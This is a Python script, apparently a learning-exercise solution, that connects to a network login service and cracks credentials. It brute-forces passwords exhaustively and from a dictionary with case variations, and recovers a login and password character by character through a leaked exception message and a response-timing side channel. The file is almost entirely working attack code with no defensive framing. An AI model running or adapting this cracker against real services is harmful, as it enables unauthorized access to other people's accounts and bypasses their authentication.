# import socket
# import argparse
# import itertools
#
# class Hacking():
#
#     def __init__(self):
#
#     self.parser = argparse.ArgumentParser()
#     self.parser.add_argument('ip_address')
#     self.parser.add_argument('port')
#     # parser.add_argument('message_to_send')
#
#     self.args = parser.parse_args()
#     self.ip_address = args.ip_address
#     self.port = args.port
#     self.message_to_send = args.message_to_send
#     selfaddress = (self.ip_address, int(self.port))
#
#     def send_message(self, message):
#         with socket.socket() as my_socket:
#             my_socket.connect(self.address)
#             my_socket.send(message_to_send.encode())
#             message_received = my_socket.recv(1024)
#             print(message_received.decode())
#
#

import socket
import argparse
import itertools
import string
import os
import json
import time


class Hacking():

    def __init__(self):
        self.address = None

    def set_address(self, ip, port):
        self.address = (ip, int(port))
        # print(self.address)
    def send_message(self, message_to_send):
        with socket.socket() as my_socket:
            my_socket.connect(self.address)
            my_socket.send(message_to_send.encode())
            message_received = my_socket.recv(1024)
            print(message_received.decode())

    def brute_force_password(self):
        with socket.socket() as my_socket:
            my_socket.connect(self.address)
            message_received = 'init'
            alphanumeric_collection = string.ascii_lowercase + string.digits
            password_length = 1
            while message_received not in ("Connection success!", 'Too many attempts'):
                for message in itertools.product(alphanumeric_collection, repeat=password_length):
                    message_to_send = ''.join(message)
                    my_socket.send(message_to_send.encode())
                    message_received = my_socket.recv(1024).decode()

                    if message_received in "Connection success!":
                        print(message_to_send)
                        break
                    if message_received in 'Too many attempts':
                        break
                password_length += 1
                    # print(message_received.decode())

    def brute_force_dictionary(self, file_path):
        with open(file_path, 'r') as passwords_file:
            with socket.socket() as my_socket:
                my_socket.connect(self.address)
                # message_received = None
                password_found = None
                for password in passwords_file:
                    password = password.rstrip('\n')
                    signs_sets = [(sign.lower(), sign.upper()) if sign in string.ascii_letters else sign for sign in password]
                    for message_to_send in itertools.product(*signs_sets):
                        # print(''.join(message_to_send))
                        my_socket.send(''.join(message_to_send).encode())
                        message_received = my_socket.recv(10240).decode()
                        if message_received in "Connection success!":
                            password_found = ''.join(message_to_send)
                            print(password_found)
                            break
                        if message_received in 'Too many attempts':
                            break
                    if password_found is not None:
                        break

    def login_password_viaexception(self, login_file_path):
        with socket.socket() as my_socket:
            my_socket.connect(self.address)

            credentials_send_dict = {"login": "", "password":''}
            # Guessing login
            with open(login_file_path) as logins_file:
                for login in logins_file:
                    # print(login)
                    login = login.rstrip('\n')
                    credentials_send_dict['login'] = login
                    credentials_send_json = json.dumps(credentials_send_dict)
                    my_socket.send(credentials_send_json.encode())
                    message_received = json.loads(my_socket.recv(1024).decode())['result']
                    if message_received == "Wrong login!":
                        continue
                    if message_received == 'Wrong password!':
                        # print(credentials_send_dict)
                        break
                    if message_received == 'Bad request!':
                        print('bad request')
            # Guessing password
            alphanumeric_collection = string.ascii_letters + string.digits
            # password_length = 1
            password = []
            # print(credentials_send_dict)
            while message_received not in ('Connection success!', 'Too many attempts'):
                for sign in alphanumeric_collection:
                    # print(sign)
                    # print(password)
                    password_send = password + [sign]
                    credentials_send_dict['password'] = ''.join(password_send)
                    credentials_send_json = json.dumps(credentials_send_dict)
                    # print(credentials_send_json)
                    my_socket.send(credentials_send_json.encode())
                    message_received = json.loads(my_socket.recv(1024).decode())['result']
                    # print(message_received)
                    if message_received in "Connection success!":
                        print(credentials_send_json)
                        break
                    if message_received in 'Too many attempts':
                        break
                    if message_received in "Exception happened during login":
                        password.append(sign)

                        break
                # print('za petla')
                # print(len(password))
                # password_length += 1

    def login_password_viatime(self, login_file_path):
        with socket.socket() as my_socket:
            my_socket.connect(self.address)

            credentials_send_dict = {"login": "", "password": ''}
            # Guessing login
            with open(login_file_path) as logins_file:
                for login in logins_file:
                    # print(login)
                    login = login.rstrip('\n')
                    credentials_send_dict['login'] = login
                    credentials_send_json = json.dumps(credentials_send_dict)
                    my_socket.send(credentials_send_json.encode())
                    message_received = json.loads(my_socket.recv(1024).decode())['result']
                    if message_received == "Wrong login!":
                        continue
                    if message_received == 'Wrong password!':
                        # print(credentials_send_dict)
                        break
                    if message_received == 'Bad request!':
                        print('bad request')
            # Guessing password
            alphanumeric_collection = string.ascii_letters + string.digits
            # password_length = 1
            password = []
            # print(credentials_send_dict)
            while message_received not in ('Connection success!', 'Too many attempts'):
                for sign in alphanumeric_collection:
                    # print(sign)
                    # print(password)
                    password_send = password + [sign]
                    credentials_send_dict['password'] = ''.join(password_send)
                    credentials_send_json = json.dumps(credentials_send_dict)
                    # print(credentials_send_json)
                    time_send = time.perf_counter()
                    my_socket.send(credentials_send_json.encode())
                    message_received = json.loads(my_socket.recv(1024).decode())['result']
                    time_receive = time.perf_counter()
                    time_taken = time_receive - time_send
                    # print(time_taken)
                    # print(message_received)
                    if message_received in "Connection success!":
                        print(credentials_send_json)
                        break
                    if message_received in 'Too many attempts':
                        break
                    if message_received in "Wrong password!" and time_taken>0.01:
                        password.append(sign)

                        break
                # print('za petla')
                # print(len(password))
                # password_length += 1




def main():

    parser = argparse.ArgumentParser()
    parser.add_argument('ip_address')
    parser.add_argument('port')
    # parser.add_argument('message_to_send')

    args = parser.parse_args()
    ip_address = args.ip_address
    port = args.port
    # message_to_send = args.message_to_send
    # address = (ip_address, int(port))

    hack = Hacking()
    hack.set_address(ip_address, port)
    # hack.send_message(message_to_send)
    # hack.brute_force_password()

    # here = os.path.dirname(os.path.abspath(__file__))
    # file_path = os.path.join(here, 'passwor.txt')
    # hack.brute_force_dictionary(file_path)

    here = os.path.dirname(os.path.abspath(__file__))
    file_path = os.path.join(here, 'logins.txt')
    # hack.login_password_viaexception(file_path)
    hack.login_password_viatime(file_path)
if __name__ == "__main__":
    main()